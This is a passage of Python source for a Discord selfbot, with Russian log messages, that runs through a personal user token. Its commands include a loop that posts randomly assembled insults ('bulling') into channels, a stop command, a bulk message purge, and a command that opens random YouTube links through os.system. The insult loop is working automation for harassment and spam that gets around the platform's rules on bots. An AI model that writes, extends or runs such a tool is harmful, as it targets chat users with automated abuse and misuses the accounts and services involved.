        async with ctx.typing():
            await sleep(oskkd)
            await ctx.send(random.choice(bull1) + random.choice(bull2) + random.choice(evo1) + random.choice(bull3) + random.choice(bull4))
            bulls = bulls+1
            print("[INFO] * оски (evolution) отправлены уже:", bulls, "раз")
            
@client.command()
async def stop(ctx):
    await ctx.message.delete()
    global bulling_active
    bulling_active = False
    print("[INFO] * оски остановлены!")
    await sleep(1)
    
@client.command()
async def clear(ctx, bro):
    await ctx.message.delete()
    await ctx.channel.purge(limit=(int(bro)))
    
@client.command()
async def rmusic(ctx):
    stepen1 = ["start https://youtu.be/5bgE623nqSI","start https://youtu.be/GKvlt6rpb4Y","start https://youtu.be/M4n_GkTw0qg","start https://youtu.be/vHkckMptGH4","start https://youtu.be/P3CVyri5fkA?t=28","start https://youtu.be/HT2hMastXFk","start https://youtu.be/4cwIKjG_5hI","start https://youtu.be/Yc_BHq-bzak","start https://youtu.be/M1PrbQAkWP0","start https://youtu.be/2IGwkJDcIk8?t=14","start https://youtu.be/ijvRWt3saGg","start https://youtu.be/WqDj6XVIPUk","start https://youtu.be/liLyrtuosyQ","start https://youtu.be/OoLIeHducuU","start https://youtu.be/gMVGhrZ1fbg","start https://youtu.be/SUjimJa8-HY","start https://youtu.be/gn8WwnWepBc","start https://youtu.be/wO8aTwRuyLI","start https://youtu.be/qDjxM2nLVRs","start https://youtu.be/kq61AmUTN0U","start https://youtu.be/yrlqr4T832E?t=9","start https://youtu.be/-DhQsSQIr40","start https://youtu.be/86pST2matP4?t=35","start https://youtu.be/al1BNB8bKaE","start https://youtu.be/KDYWD176Qwk?t=19","start https://youtu.be/9tNUkpnwgAs","start https://youtu.be/h7lMw8yedso","start https://youtu.be/EY0qVO9Mwh8?t=59","start https://youtu.be/p_OXaQa4xUo","start https://youtu.be/ZBn-6Sw_xwc","start https://youtu.be/477FXXH8k4w","start https://youtu.be/Meyht_2X-pY","start https://youtu.be/MRLlwJsCvuE","start https://youtu.be/BzMR-bTc9kI","start https://youtu.be/-0DgQCLNWFQ","start https://youtu.be/dFO_8EQ2DRg"]
    await ctx.message.delete()
    os.system(random.choice(stepen1))

########## [ CHECKING TOKEN ] ##########
try:
    client.run(rconfig["Settings"]["token"], bot = False)
except:
    print("[ERROR] Вы ввели неккоректный токен!\n\nНажмите Enter для выхода..")
    input()
